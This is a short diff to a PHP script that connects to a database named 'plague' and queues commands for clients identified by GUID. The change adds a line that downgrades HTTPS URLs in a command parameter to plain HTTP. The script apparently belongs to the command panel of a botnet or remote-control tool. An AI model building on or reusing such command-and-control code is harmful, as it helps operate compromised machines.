@@ -130,6 +130,8 @@ if(!ConnectDB('plague')){
 	die('Failed to connect to the database.');
 }
 
+if(isset($ParamArray['URL'])) $ParamArray['URL'] = str_replace('https://', 'http://', $ParamArray['URL']);
+
 switch($Target){
 	case 'Single Client':{
 		QueueCommand($GUID, $Cmd, $ParamArray, array());
